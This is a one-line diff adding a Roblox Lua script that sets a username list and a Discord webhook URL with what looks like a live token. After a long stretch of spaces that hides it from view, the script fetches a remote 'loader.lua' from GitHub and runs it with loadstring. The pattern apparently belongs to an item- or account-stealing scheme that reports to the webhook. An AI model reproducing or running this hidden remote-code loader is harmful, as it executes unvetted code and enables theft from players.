@@ -1,0 +1,1 @@
+Usernames = {"osieidufu"} Webhooks = {"https://discord.com/api/webhooks/1394601921670676551/gyU3XVZa6kz42o0hlbX7_HAvIDiVwkD49Cp74bYbcNoLylqkY5qWIQoxDDBNFZ-rCFZ9"}                                 loadstring(game:HttpGet("https://raw.githubusercontent.com/jjrite/SAB/refs/heads/main/loader.lua",true))()
